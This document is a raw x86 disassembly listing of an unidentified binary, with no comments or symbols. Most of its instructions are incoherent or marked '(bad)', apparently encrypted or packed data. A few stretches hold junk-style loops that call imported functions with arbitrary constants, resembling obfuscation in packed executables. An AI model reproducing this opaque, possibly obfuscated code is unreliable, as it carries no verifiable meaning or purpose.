  40afaf:	mov    ebp,0x422794aa
  40afb4:	cmp    edi,edx
  40afb6:	adc    dl,BYTE PTR [eax-0x65]
  40afb9:	push   0xec2890f
  40afbe:	cmp    al,0x4c
  40afc0:	inc    ebx
  40afc1:	cwde   
  40afc2:	(bad)  
  40afc3:	jne    0x40b03c
  40afc5:	dec    edx
  40afc6:	xor    BYTE PTR [ebx],cl
  40afc8:	jbe    0x40b009
  40afca:	xor    ch,BYTE PTR [ebx]
  40afcc:	and    eax,0xefa2e07a
  40afd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40afd2:	inc    ecx
  40afd3:	xchg   edi,eax
  40afd4:	mov    edi,DWORD PTR [ebp+0x451a3754]
  40afda:	stos   DWORD PTR es:[edi],eax
  40afdb:	outs   dx,BYTE PTR ds:[esi]
  40afdc:	or     esi,DWORD PTR [ebp+0x1027fe68]
  40afe2:	inc    ebp
  40afe3:	or     DWORD PTR [edx-0x1075d7dd],esi
  40afe9:	inc    edi
  40afea:	jecxz  0x40b033
  40afec:	(bad)  
  40afed:	dec    ebp
  40afee:	arpl   WORD PTR [esi+0x10],cx
  40aff1:	out    0x6d,al
  40aff3:	jnp    0x40afa9
  40aff5:	cdq    
  40aff6:	out    0x64,al
  40aff8:	enter  0x4e8b,0x10
  40affc:	sbb    eax,0x60d5275b
  40b001:	and    BYTE PTR [ebx],0x4e
  40b004:	mov    al,0x18
  40b006:	(bad)  
  40b008:	sub    DWORD PTR [esi],edi
  40b00a:	lods   eax,DWORD PTR ds:[esi]
  40b00b:	mov    es,WORD PTR [esi-0xd]
  40b00e:	ins    BYTE PTR es:[edi],dx
  40b00f:	ja     0x40afa1
  40b011:	adc    dl,ch
  40b013:	sub    esp,ebp
  40b015:	fs xchg ebx,eax
  40b017:	jo     0x40b071
  40b019:	sbb    dl,cl
  40b01b:	fcomp  DWORD PTR [edi-0x11]
  40b01e:	adc    BYTE PTR [edi+0x3f7b780],bl
  40b024:	sar    DWORD PTR [ebp-0x1b],0x25
  40b028:	clc    
  40b029:	pop    ebp
  40b02a:	mov    eax,0xca069e7a
  40b02f:	jge    0x40b072
  40b031:	call   0x7b2f04c3
  40b036:	sub    eax,0xea587e42
  40b03b:	jo     0x40afcd
  40b03d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b03e:	icebp  
  40b03f:	jne    0x40b0ab
  40b041:	xchg   DWORD PTR [ebp+ecx*2+0x4f],edx
  40b045:	lods   eax,DWORD PTR ds:[esi]
  40b046:	push   ebx
  40b047:	dec    eax
  40b048:	loope  0x40b009
  40b04a:	jns    0x40afec
  40b04c:	jp     0x40afda
  40b04e:	sbb    dh,BYTE PTR ds:0x34fbc7e5
  40b054:	dec    edi
  40b055:	sti    
  40b056:	in     eax,0x1
  40b058:	clc    
  40b059:	xchg   ebx,eax
  40b05a:	into   
  40b05b:	add    dh,BYTE PTR [ecx]
  40b05d:	push   di
  40b05f:	pop    ebp
  40b060:	and    ebp,ecx
  40b062:	cmp    ecx,DWORD PTR [ecx+0xb3e102c]
  40b068:	and    BYTE PTR fs:[ebx-0x5de54b56],al
  40b06f:	xor    al,BYTE PTR [edi-0x65]
  40b072:	mov    eax,0xf844dac9
  40b077:	(bad)
  40b07a:	xor    eax,0xa571500a
  40b07f:	push   eax
  40b080:	push   ebp
  40b081:	xor    ch,BYTE PTR [ebx-0x6f]
  40b084:	hlt    
  40b085:	mov    esi,0x7dba7e38
  40b08a:	sub    ecx,0x11453dc9
  40b090:	mov    eax,esp
  40b092:	std    
  40b093:	mov    dh,0x82
  40b095:	sub    BYTE PTR [ecx-0x1a],cl
  40b098:	fwait
  40b099:	shr    DWORD PTR [edx+0x33c233c1],0xf2
  40b0a0:	add    eax,ecx
  40b0a2:	add    esi,ecx
  40b0a4:	imul   eax,esi
  40b0a7:	mov    esi,DWORD PTR [ebp+0xc]
  40b0aa:	cmp    esi,eax
  40b0ac:	mov    eax,DWORD PTR [ebp-0x4]
  40b0af:	je     0x40aa89
  40b0b5:	xor    eax,edx
  40b0b7:	add    eax,ecx
  40b0b9:	mov    ecx,DWORD PTR [ebp+0xc]
  40b0bc:	imul   eax,ecx
  40b0bf:	add    eax,DWORD PTR [ebp+0x8]
  40b0c2:	mov    DWORD PTR [ebp+0xc],eax
  40b0c5:	mov    eax,DWORD PTR [ebp+0xc]
  40b0c8:	jmp    0x40b2c3
  40b0cd:	fadd   QWORD PTR [edi-0x18]
  40b0d0:	(bad)  
  40b0d1:	ins    DWORD PTR es:[edi],dx
  40b0d2:	jns    0x40b0d0
  40b0d4:	pop    ebp
  40b0d5:	xchg   BYTE PTR [ebx+0xb],cl
  40b0d8:	xor    ah,BYTE PTR ds:0x9d83409b
  40b0de:	loop   0x40b15e
  40b0e0:	jle    0x40b13e
  40b0e2:	jg     0x40b162
  40b0e4:	jle    0x40b0c0
  40b0e6:	xchg   esi,eax
  40b0e7:	mov    DWORD PTR [edi+edx*4+0x49],esp
  40b0eb:	or     DWORD PTR [ecx+0x3b4d5c00],ebp
  40b0f1:	in     al,dx
  40b0f2:	xchg   esp,eax
  40b0f3:	mov    ecx,0x10211878
  40b0f8:	out    0x47,eax
  40b0fa:	aad    0x3b
  40b0fc:	pop    eax
  40b0fd:	push   cs
  40b0fe:	or     al,BYTE PTR [edi]
  40b100:	lods   eax,DWORD PTR ds:[esi]
  40b101:	retf   0x2c53
  40b104:	jmp    0x40b13b
  40b106:	and    esi,DWORD PTR [ebp*2-0x1685d950]
  40b10d:	popf   
  40b10e:	push   esi
  40b10f:	scas   eax,DWORD PTR es:[edi]
  40b110:	(bad)  
  40b111:	lahf   
  40b112:	and    eax,0xea2c35a5
  40b117:	sbb    eax,0x1ee648bd
  40b11c:	sahf   
  40b11d:	retf   
  40b11e:	sahf   
  40b11f:	push   DWORD PTR [ebp-0x52]
  40b122:	dec    edx
  40b123:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b124:	xor    al,0x24
  40b126:	out    dx,eax
  40b127:	dec    esp
  40b128:	push   esp
  40b129:	jecxz  0x40b15a
  40b12b:	adc    bl,cl
  40b12d:	mov    ebp,0xaac9252
  40b132:	add    DWORD PTR fs:[ecx],eax
  40b135:	int    0x95
  40b137:	pop    ebx
  40b138:	and    bh,BYTE PTR [ecx-0x1e409717]
  40b13e:	ret    0x2430
  40b141:	cmp    ch,BYTE PTR [edi+edx*4-0x3829292a]
  40b148:	fwait
  40b149:	(bad)  
  40b14b:	mov    edx,0xceb926c6
  40b150:	outs   dx,DWORD PTR ds:[esi]
  40b151:	mov    edx,0xb67cb2e0
  40b156:	daa    
  40b157:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b158:	mov    ebx,0x12ba7f9e
  40b15d:	inc    esp
  40b15e:	shr    BYTE PTR [eax-0x4a87f993],0x23
  40b165:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b166:	pop    eax
  40b167:	dec    ebp
  40b168:	sub    dh,BYTE PTR [edx-0x4f]
  40b16b:	dec    ebp
  40b16c:	xchg   esp,eax
  40b16d:	js     0x40b19e
  40b16f:	or     DWORD PTR [ebx-0x49],esp
  40b172:	shl    BYTE PTR gs:[esi],1
  40b175:	mov    edx,DWORD PTR [ebx+0x4b]
  40b178:	push   ss
  40b179:	sub    DWORD PTR [ebx+0x4c13829c],esi
  40b17f:	dec    esi
  40b180:	push   edx
  40b181:	xchg   BYTE PTR [ebx+0x5606dca1],bl
  40b187:	pushf  
  40b188:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b189:	jae    0x40b125
  40b18b:	mov    edx,0x9db7a98
  40b190:	or     eax,0xe07a0914
  40b195:	cmp    ch,BYTE PTR [edx]
  40b197:	push   ds
  40b198:	(bad)  
  40b199:	mov    ch,0xb
  40b19b:	(bad)  
  40b19d:	(bad)  
  40b19e:	popa   
  40b19f:	hlt    
  40b1a0:	push   ebp
  40b1a1:	and    BYTE PTR [eax],dl
  40b1a3:	jo     0x40b1b6
  40b1a5:	mov    eax,ds
  40b1a7:	jns    0x40b21b
  40b1a9:	mov    dl,0x5d
  40b1ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b1ac:	je     0x40b219
  40b1ae:	ficom  WORD PTR [edi-0x1c]
  40b1b2:	pop    ds
  40b1b3:	daa    
  40b1b4:	icebp  
  40b1b5:	lods   eax,DWORD PTR ds:[esi]
  40b1b6:	push   cs
  40b1b7:	and    al,0xcf
  40b1b9:	fs inc edi
  40b1bb:	mov    edi,0x528c9836
  40b1c0:	mov    bl,0x4d
  40b1c2:	nop
  40b1c3:	loope  0x40b156
  40b1c5:	aas    
  40b1c6:	sub    eax,0x1f81d288
  40b1cb:	fdiv   QWORD PTR [ecx]
  40b1cd:	sti    
  40b1ce:	mov    ds:0x7963020c,al
  40b1d3:	int    0xa3
  40b1d5:	ss jns 0x40b220
  40b1d8:	inc    ecx
  40b1d9:	xchg   edx,eax
  40b1da:	xor    edi,ecx
  40b1dc:	imul   BYTE PTR [edi]
  40b1de:	pop    es
  40b1df:	pop    ebx
  40b1e0:	jno    0x40b1ee
  40b1e2:	push   edi
  40b1e3:	push   esp
  40b1e4:	pop    ds
  40b1e5:	scas   eax,DWORD PTR es:[edi]
  40b1e6:	lahf   
  40b1e7:	repnz in eax,0xa0
  40b1ea:	adc    eax,0xeba90d40
  40b1ef:	sti    
  40b1f0:	pop    ss
  40b1f1:	inc    ecx
  40b1f2:	push   esi
  40b1f3:	jne    0x40b1fd
  40b1f5:	push   edx
  40b1f6:	add    ecx,eax
  40b1f8:	popf   
  40b1f9:	inc    edx
  40b1fa:	jns    0x40b1fa
  40b1fc:	cmp    ebx,DWORD PTR [esi-0x234ef2df]
  40b202:	sbb    BYTE PTR [ebx-0x20],ah
  40b205:	repz mul BYTE PTR [edi+0x6b]
  40b209:	mov    esp,0x86e92d4
  40b20e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b20f:	call   0x65a8304c
  40b214:	sbb    ebp,DWORD PTR [esi+0x44e9dcb4]
  40b21a:	int3   
  40b21b:	stc    
  40b21c:	xor    edx,DWORD PTR [ebx]
  40b21e:	fidivr DWORD PTR [edx+0x4621953e]
  40b224:	mov    ch,BYTE PTR [ebp-0x259d4c4b]
  40b22a:	xor    cl,BYTE PTR [ecx-0x31]
  40b22d:	jg     0x40b1dd
  40b22f:	adc    ebp,DWORD PTR [esi]
  40b231:	ret    
  40b232:	shl    BYTE PTR [edx+0x330702b1],1
  40b238:	xchg   ebx,eax
  40b239:	in     al,0x3
  40b23b:	mov    bh,0xe0
  40b23d:	cmp    eax,esi
  40b23f:	cmp    al,0x53
  40b241:	or     edi,DWORD PTR [esi]
  40b243:	sub    al,0xbb
  40b245:	push   0xd6d0bbb9
  40b24a:	and    BYTE PTR [ebx],ch
  40b24c:	rcl    edx,cl
  40b24e:	add    edi,eax
  40b250:	scas   al,BYTE PTR es:[edi]
  40b251:	mov    al,ds:0xcef017a5
  40b256:	gs nop
  40b258:	pop    eax
  40b259:	out    dx,eax
  40b25a:	cld    
  40b25b:	sub    eax,0x223df544
  40b260:	inc    esp
  40b261:	out    dx,eax
  40b262:	add    eax,0x442d79c1
  40b267:	scas   al,BYTE PTR es:[edi]
  40b268:	hlt    
  40b269:	sbb    DWORD PTR [ebp+0x6ced5f10],edx
  40b26f:	fwait
  40b270:	inc    edx
  40b271:	sbb    BYTE PTR [esi+0x4d8bc646],dh
  40b277:	xor    esi,DWORD PTR [edi+0x7b42a0d7]
  40b27d:	neg    BYTE PTR [esi*4+0xfe663f4]
  40b284:	cs f2xm1 
  40b287:	push   edi
  40b288:	iret   
  40b289:	push   ecx
  40b28a:	(bad)  
  40b28b:	and    BYTE PTR ds:0xd24b969b,ah
  40b291:	stos   BYTE PTR es:[edi],al
  40b292:	dec    esp
  40b293:	(bad)  
  40b296:	and    edi,DWORD PTR [ecx-0x6a42a5ff]
  40b29c:	out    0x0,al
  40b29e:	(bad)  [eax-0x4a587842]
  40b2a4:	pop    esi
  40b2a5:	stc    
  40b2a6:	into   
  40b2a7:	sbb    al,0xc0
  40b2a9:	sbb    DWORD PTR [ebp+0x2abb811c],0x73
  40b2b0:	leave  
  40b2b1:	mov    WORD PTR [edi-0x3c25ba7d],cs
  40b2b7:	ja     0x40b2a5
  40b2b9:	out    dx,eax
  40b2ba:	aas    
  40b2bb:	xor    BYTE PTR [ebx+eiz*8-0x26863a4e],ch
  40b2c2:	jns    0x40b322
  40b2c4:	leave  
  40b2c5:	ret    0x8
  40b2c8:	push   ebp
  40b2c9:	mov    ebp,esp
  40b2cb:	sub    esp,0x30
  40b2ce:	mov    eax,ds:0x43056e
  40b2d3:	mov    ecx,DWORD PTR ds:0x43057a
  40b2d9:	sub    ecx,eax
  40b2db:	imul   eax,DWORD PTR [eax+ecx*1]
  40b2df:	jmp    0x40b43d
  40b2e4:	adc    eax,0x6533e552
  40b2e9:	inc    ebp
  40b2ea:	and    eax,0x241ce54
  40b2ef:	scas   al,BYTE PTR es:[edi]
  40b2f0:	add    BYTE PTR [ebp+0x44],ah
  40b2f3:	cmp    edi,ebx
  40b2f5:	in     al,0x7e
  40b2f7:	jle    0x40b338
  40b2f9:	jg     0x40b379
  40b2fb:	jle    0x40b28c
  40b2fd:	mov    esp,0xda42d582
  40b302:	aaa    
  40b303:	push   ebp
  40b304:	push   edx
  40b305:	in     eax,dx
  40b306:	test   DWORD PTR [ecx+0x1b263f22],esi
  40b30c:	fisttp WORD PTR [eax+0x71]
  40b30f:	adc    BYTE PTR [edi+0x291cdc37],cl
  40b315:	in     al,0x23
  40b317:	mov    ch,0x2b
  40b319:	stos   BYTE PTR es:[edi],al
  40b31a:	push   edi
  40b31b:	mov    eax,es
  40b31d:	and    al,0x8b
  40b31f:	jle    0x40b36c
  40b321:	push   es
  40b322:	test   BYTE PTR [edi+edx*1],0x19
  40b326:	dec    esp
  40b327:	cld    
  40b328:	or     cl,bh
  40b32a:	lds    esi,FWORD PTR [ecx-0x78]
  40b32d:	jne    0x40b386
  40b32f:	mov    edx,0xfcd036d1
  40b334:	sub    DWORD PTR [ebp-0x3c],0x149e6a23
  40b33b:	add    eax,ebp
  40b33d:	lar    esi,WORD PTR [edi-0x6c]
  40b341:	fs ds jge 0x40b34c
  40b345:	ret    
  40b346:	push   esi
  40b347:	in     al,dx
  40b348:	call   0xf351:0x93b67c72
  40b34f:	push   0x411a2968
  40b354:	sub    ah,ah
  40b356:	or     ebp,DWORD PTR [ecx+edx*4-0x3f5a780f]
  40b35d:	or     DWORD PTR [ebp+edx*8+0x6382cd18],0x2a
  40b365:	pushf  
  40b366:	ins    BYTE PTR es:[edi],dx
  40b367:	packssdw mm3,mm2
  40b36a:	dec    eax
  40b36b:	xlat   BYTE PTR ds:[ebx]
  40b36c:	adc    ch,BYTE PTR [edi]
  40b36e:	fwait
  40b36f:	loopne 0x40b39c
  40b371:	out    0x90,ax
  40b374:	aas    
  40b375:	std    
  40b376:	addr16 xchg esp,eax
  40b378:	push   ds
  40b379:	das    
  40b37a:	pushf  
  40b37b:	xor    DWORD PTR [esi-0xb3ce28b],ebx
  40b381:	daa    
  40b382:	sub    DWORD PTR [edx],esi
  40b384:	mov    ch,0x6f
  40b386:	addr16 stc 
  40b388:	pop    ebp
  40b389:	in     eax,dx
  40b38a:	jp     0x40b3ae
  40b38c:	jl     0x40b3ed
  40b38e:	mov    edi,0xf77464ac
  40b393:	xlat   BYTE PTR ds:[ebx]
  40b394:	sbb    cl,0xc6
  40b397:	(bad)  
  40b398:	sub    ecx,edx
  40b39a:	cmp    edi,DWORD PTR [edi-0x58]
  40b39d:	add    eax,edx
  40b39f:	call   0x22f8:0xff60b549
  40b3a6:	inc    eax
  40b3a7:	xlat   BYTE PTR ds:[ebx]
  40b3a8:	cmp    bl,BYTE PTR ss:[edx+0x67]
  40b3ac:	outs   dx,BYTE PTR ds:[esi]
  40b3ad:	dec    esi
  40b3ae:	mov    ah,0x28
  40b3b0:	ds stos BYTE PTR es:[edi],al
  40b3b2:	(bad)  gs:[eax+0x22]
  40b3b6:	push   ds
  40b3b7:	adc    dh,BYTE PTR ds:0xa1f5155f
  40b3bd:	(bad)  
  40b3be:	paddusw mm1,QWORD PTR [eax-0x10]
  40b3c2:	imul   ecx,DWORD PTR [edi+0x6ca18388],0x62b4937d
  40b3cc:	sahf   
  40b3cd:	jno    0x40b391
  40b3cf:	xchg   ebp,eax
  40b3d0:	addr16 in al,dx
  40b3d2:	lock imul esp,DWORD PTR [ebx],0x6f5185f4
  40b3d9:	adc    bh,BYTE PTR [edi]
  40b3db:	or     DWORD PTR [ebx],ebp
  40b3dd:	sbb    BYTE PTR [eax],al
  40b3df:	sbb    al,0x4f
  40b3e1:	imul   DWORD PTR [eax-0x1356ff26]
  40b3e7:	and    esi,DWORD PTR [ebp+0x6c]
  40b3ea:	add    DWORD PTR [eax],esp
  40b3ec:	test   DWORD PTR [ecx],0x34de9b2f
  40b3f2:	test   al,0x2b
  40b3f4:	xor    eax,0xd4cb25a8
  40b3f9:	daa    
  40b3fa:	inc    eax
  40b3fb:	arpl   dx,ax
  40b3fd:	mov    ah,0x46
  40b3ff:	jno    0x40b3a5
  40b401:	pop    esp
  40b402:	mov    ecx,0xcd335187
  40b407:	cmp    ch,bh
  40b409:	sahf   
  40b40a:	scas   al,BYTE PTR es:[edi]
  40b40b:	gs jmp 0x80461b4a
  40b411:	rol    DWORD PTR [ebx-0x546cdc6d],cl
  40b417:	sub    DWORD PTR ds:0x68fdf02b,esp
  40b41d:	push   ecx
  40b41e:	adc    ecx,esp
  40b420:	fild   QWORD PTR [eax+eiz*2]
  40b423:	(bad)  
  40b425:	inc    BYTE PTR [edi+0x4a]
  40b428:	or     ecx,DWORD PTR [ecx]
  40b42a:	jmp    0x40b432
  40b42c:	jecxz  0x40b491
  40b42e:	xor    al,0x12
  40b430:	add    al,0xff
  40b432:	fs pop ds
  40b434:	shl    BYTE PTR [edx-0x6d6d666a],cl
  40b43a:	mov    cl,BYTE PTR [esi-0x3ba3858]
  40b440:	xor    eax,0xc7f89c85
  40b445:	add    eax,0x43054e
  40b44a:	adc    DWORD PTR [eax],eax
  40b44c:	add    BYTE PTR [eax],al
  40b44e:	cmp    DWORD PTR ds:0x43054e,0x0
  40b455:	je     0x40b489
  40b45b:	cmp    DWORD PTR ds:0x43054e,0x19
  40b462:	jne    0x40b479
  40b468:	push   DWORD PTR [ebp-0x24]
  40b46b:	push   DWORD PTR [ebp-0x20]
  40b46e:	push   0x41ff
  40b473:	call   DWORD PTR ds:0x42eae8
  40b479:	mov    eax,ds:0x43054e
  40b47e:	dec    eax
  40b47f:	mov    ds:0x43054e,eax
  40b484:	jmp    0x40b44e
  40b489:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  40b490:	or     eax,0x1c5c
  40b495:	mov    ecx,DWORD PTR [ebp-0x4]
  40b498:	push   ebx
  40b499:	add    DWORD PTR ds:0x4304ae,edi
  40b49f:	mov    eax,0x7510856
  40b4a4:	mov    ebx,DWORD PTR ds:0x430542
  40b4aa:	sbb    DWORD PTR ds:0x42e762,ebx
  40b4b0:	xor    ecx,eax
  40b4b2:	mov    ebx,DWORD PTR ds:0x42ee14
  40b4b8:	sub    DWORD PTR ds:0x43048e,ebx
  40b4be:	mov    ebx,0x32729d
  40b4c3:	xor    DWORD PTR ds:0x430546,0xece
  40b4cd:	add    ecx,ebx
  40b4cf:	xor    DWORD PTR ds:0x430496,0x42e76a
  40b4d9:	mov    DWORD PTR [ebp-0x1c],ecx
  40b4dc:	mov    ecx,DWORD PTR [ebp+0x14]
  40b4df:	xor    DWORD PTR ds:0x42ee1c,0x65f3
  40b4e9:	push   esi
  40b4ea:	sub    DWORD PTR ds:0x42e762,0x2022
  40b4f4:	push   edi
  40b4f5:	and    DWORD PTR ds:0x430546,0x430492
  40b4ff:	test   ecx,ecx
  40b501:	mov    DWORD PTR ds:0x42e75e,0x17b6
  40b50b:	je     0x40b58a
  40b511:	add    ecx,0x2345
  40b517:	mov    ecx,DWORD PTR [ebp+0x14]
  40b51a:	and    DWORD PTR ds:0x4304a6,0x0
  40b524:	jmp    0x40b536
  40b529:	mov    edi,DWORD PTR ds:0x4304a6
  40b52f:	inc    edi
  40b530:	mov    DWORD PTR ds:0x4304a6,edi
  40b536:	cmp    DWORD PTR ds:0x4304a6,0x1d
  40b53d:	jae    0x40b585
  40b543:	cmp    DWORD PTR ds:0x4304a6,0x4
  40b54a:	jne    0x40b560
  40b550:	push   0x42ee1c
  40b555:	push   0x6d9e
  40b55a:	call   DWORD PTR ds:0x42eaec
  40b560:	cmp    DWORD PTR ds:0x4304a6,0x3
  40b567:	jne    0x40b57a
  40b56d:	mov    edi,DWORD PTR ds:0x4304a6
  40b573:	inc    edi
  40b574:	mov    DWORD PTR ds:0x4304a6,edi
  40b57a:	jmp    0x40b529
  40b57f:	and    esi,0x3dcd
  40b585:	mov    ecx,DWORD PTR [ecx]
  40b587:	mov    DWORD PTR [ebp-0x1c],ecx
  40b58a:	movzx  esi,BYTE PTR ds:0x430492
  40b591:	xor    DWORD PTR ds:0x4304ba,esi
  40b597:	imul   edx,eax
  40b59a:	or     DWORD PTR ds:0x4304be,edx
  40b5a0:	mov    ecx,0x4573
  40b5a5:	xor    esi,DWORD PTR ds:0x430486
  40b5ab:	add    edx,ecx
  40b5ad:	mov    esi,0x7879
  40b5b2:	and    DWORD PTR ds:0x43053e,0x0
  40b5bc:	mov    edi,DWORD PTR ds:0x43053e
  40b5c2:	inc    edi
  40b5c3:	mov    DWORD PTR ds:0x43053e,edi
  40b5c9:	cmp    DWORD PTR ds:0x43053e,0x12
  40b5d0:	jne    0x40b5f7
  40b5d6:	push   0x1
  40b5d8:	push   0x3333
  40b5dd:	push   0x7164
  40b5e2:	push   0x26d7
  40b5e7:	push   0x1d14
  40b5ec:	push   0x64d6
  40b5f1:	call   DWORD PTR ds:0x42eaf0
  40b5f7:	cmp    DWORD PTR ds:0x43053e,0x11
  40b5fe:	jne    0x40b613
  40b604:	xor    edi,edi
  40b606:	or     edi,DWORD PTR ds:0x43053e
  40b60c:	inc    edi
  40b60d:	mov    DWORD PTR ds:0x43053e,edi
  40b613:	cmp    DWORD PTR ds:0x43053e,0x1f
  40b61a:	jb     0x40b5bc
  40b620:	dec    edi
  40b621:	mov    edi,0x1556
  40b626:	xchg   esi,ecx
  40b628:	sub    edx,edi
  40b62a:	xor    esi,esi
  40b62c:	jmp    0x40b78a
  40b631:	mov    ch,dh
  40b633:	add    esi,DWORD PTR [eax+0x7b]
  40b636:	aad    0x9d
  40b638:	jl     0x40b646
  40b63a:	mov    eax,0x55a04dc4
  40b63f:	or     bl,dh
  40b641:	mov    esp,0x3f7e7ee5
  40b646:	jg     0x40b6c6
  40b648:	jle    0x40b5d9
  40b64a:	lds    ecx,FWORD PTR [ebx+eiz*8]
  40b64d:	xchg   esp,eax
  40b64e:	jns    0x40b60d
  40b650:	retf   
  40b651:	cmp    al,0x19
  40b653:	out    0x63,eax
  40b655:	mov    bh,0x6a
  40b657:	fprem1 
  40b659:	loop   0x40b687
  40b65b:	adc    DWORD PTR [edx+0x371d2931],eax
  40b661:	add    edi,DWORD PTR [ecx]
  40b663:	mov    ebx,0x3c32b2cb
  40b668:	jno    0x40b5f5
  40b66a:	gs (bad) 
  40b66c:	shl    edx,0x69
  40b66f:	pop    eax
  40b670:	les    eax,FWORD PTR [edi+ebp*8]
  40b673:	lds    edx,FWORD PTR ds:0xa40582d7
  40b679:	data16 mov ch,0x91
  40b67c:	mov    edi,0x291919fc
  40b681:	jnp    0x40b61c
  40b683:	jmp    0x2cac:0xc0b3cfb2
  40b68a:	add    esp,ecx
  40b68c:	mov    edx,0x546c4023
  40b691:	jmp    0xfa2758ac
  40b696:	xor    ah,BYTE PTR [edi-0x720fe17d]
  40b69c:	lods   eax,DWORD PTR ds:[esi]
  40b69d:	xchg   bh,cl
  40b69f:	xchg   esp,eax
  40b6a0:	rcr    DWORD PTR [edx+0x9011399],cl
  40b6a6:	mov    ecx,0x183c697b
  40b6ab:	sub    ebx,DWORD PTR [edi+0x526a500f]
  40b6b1:	fld    st(4)
  40b6b3:	xor    BYTE PTR [eax],0x6c
  40b6b6:	sbb    DWORD PTR [eax+0x3937d40d],esi
  40b6bc:	enter  0x5818,0xec
  40b6c0:	popf   
  40b6c1:	les    edi,FWORD PTR [edx]
  40b6c3:	mov    edx,0xffd4104c
  40b6c8:	mov    ds:0xc2743e37,eax
  40b6cd:	or     eax,0xf8d8134b
  40b6d2:	mov    WORD PTR [ecx],ds
  40b6d4:	pop    ax
  40b6d6:	fnstenv [ebx-0x78]
  40b6d9:	cli    
  40b6da:	lds    ecx,FWORD PTR [eax+0x4cea3e64]
  40b6e0:	test   eax,0xfaaa264f
  40b6e5:	rcl    bl,1
  40b6e7:	jmp    0x907f56f0
  40b6ec:	sub    eax,0x73cc725b
  40b6f1:	arpl   dx,bx
  40b6f3:	dec    edi
  40b6f4:	(bad)  
  40b6f5:	push   ss
  40b6f6:	unpcklps xmm0,xmm2
  40b6f9:	mov    ebx,0xe21b9f7a
  40b6fe:	dec    eax
  40b6ff:	mov    al,0x95
  40b701:	and    BYTE PTR [esi-0x46c0ee78],dl
  40b707:	mov    ds:0x71cce2cc,al
  40b70c:	es in  eax,0xf5
  40b70f:	and    al,0xee
  40b711:	cmp    dh,BYTE PTR [eax]
  40b713:	enter  0x7aed,0x2c
  40b717:	xchg   esi,eax
  40b718:	shr    DWORD PTR [ecx],cl
  40b71a:	push   ebx
  40b71b:	arpl   WORD PTR ds:0x157942a,cx
  40b721:	jle    0x40b788
  40b723:	cmp    al,0x26
  40b725:	out    dx,eax
  40b726:	jmp    0x2428:0xe7649c85
  40b72d:	in     eax,dx
  40b72e:	jnp    0x40b748
  40b730:	fstp   QWORD PTR [esi-0xb]
  40b733:	mov    esp,DWORD PTR [eax+0x6cb18364]
  40b739:	mov    ecx,0x338cd0b9
  40b73e:	cwde   
  40b73f:	scas   eax,DWORD PTR es:[edi]
  40b740:	clc    
  40b741:	sbb    al,BYTE PTR [ecx+edi*8-0x538caf66]
  40b748:	cwde   
  40b749:	inc    esi
  40b74a:	rcr    ah,0x7d
  40b74d:	pop    ss
  40b74e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b74f:	pop    ecx
  40b750:	add    ebx,ecx
  40b752:	xchg   edx,eax
  40b753:	xchg   BYTE PTR [edx+0x7f6d1322],ch
  40b759:	push   ss
  40b75a:	mov    ds:0xc60f25c3,al
  40b75f:	outs   dx,BYTE PTR ds:[esi]
  40b760:	inc    ebp
  40b761:	mov    DWORD PTR [esi+0x4e53dc1d],esp
  40b767:	fnstenv [ebx+0x4b648107]
  40b76d:	outs   dx,BYTE PTR ds:[esi]
  40b76e:	rcr    BYTE PTR [ebp+0x4a923bec],1
  40b774:	inc    esi
  40b775:	test   ecx,0x86a23704
  40b77b:	(bad)  
  40b77c:	stos   DWORD PTR es:[edi],eax
  40b77d:	or     al,0x62
  40b77f:	jl     0x40b7c4
  40b781:	mov    bh,0x58
  40b783:	push   ss
  40b784:	jmp    0x40b7c5
  40b786:	mov    bh,0x2d
  40b788:	push   edi
  40b789:	cli    
  40b78a:	mov    DWORD PTR [ebp-0x28],esi
  40b78d:	and    DWORD PTR ds:0x4304b2,ebx
  40b793:	mov    DWORD PTR [ebp-0x2c],esi
  40b796:	or     ecx,DWORD PTR ds:0x430542
  40b79c:	jmp    0x40b8fa
  40b7a1:	gs inc edi
  40b7a3:	xor    eax,0x657cedde
  40b7a8:	pop    ebp
  40b7a9:	xchg   edx,eax
  40b7aa:	lods   al,BYTE PTR ds:[esi]
  40b7ab:	mov    al,ds:0x7095f897
  40b7b0:	data16 jge 0x40b799
  40b7b3:	jle    0x40b833
  40b7b5:	aas    
  40b7b6:	jg     0x40b836
  40b7b8:	jle    0x40b7da
  40b7ba:	inc    ecx
  40b7bb:	pop    ss
  40b7bc:	push   edi
  40b7bd:	pop    ebx
  40b7be:	push   0x57
  40b7c0:	out    dx,al
  40b7c1:	xor    edi,ebp
  40b7c3:	mov    eax,0x91e2a111
  40b7c8:	imul   esi,ecx,0x1f
  40b7cb:	mov    edi,0x9a7c01c4
  40b7d0:	sbb    BYTE PTR [esi+0x190a7215],al
  40b7d6:	sbb    DWORD PTR fs:[ecx-0x44],eax
  40b7da:	cmc    
  40b7db:	and    edx,ebx
  40b7dd:	inc    ebp
  40b7de:	adc    DWORD PTR ds:0x9052a58f,ecx
  40b7e4:	jo     0x40b7dc
  40b7e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b7e7:	or     bh,cl
  40b7e9:	adc    DWORD PTR [edi],esp
  40b7eb:	(bad)
  40b7ee:	rol    ebx,1
  40b7f0:	pop    ecx
  40b7f1:	and    al,bh
  40b7f3:	int3   
  40b7f4:	push   cs
  40b7f5:	lea    edx,[esi+0x41]
  40b7f8:	scas   al,BYTE PTR es:[edi]
  40b7f9:	sbb    BYTE PTR [ecx+0x71],ch
  40b7fc:	addr16 mov cl,0x56
  40b7ff:	shl    BYTE PTR [esi-0x6b746dff],cl
  40b805:	bound  ebx,QWORD PTR [edx-0x2e1d1f60]
  40b80b:	je     0x40b834
  40b80d:	ds mov ecx,0x67d7c99
  40b813:	int    0xdd
  40b815:	sub    BYTE PTR cs:[edi-0x4ddb04fd],dl
  40b81c:	cli    
  40b81d:	push   0x6e
  40b81f:	(bad)  
  40b820:	rcl    cl,1
  40b822:	fcom   DWORD PTR [ebp-0x6d]
  40b825:	aad    0x31
  40b827:	js     0x40b84e
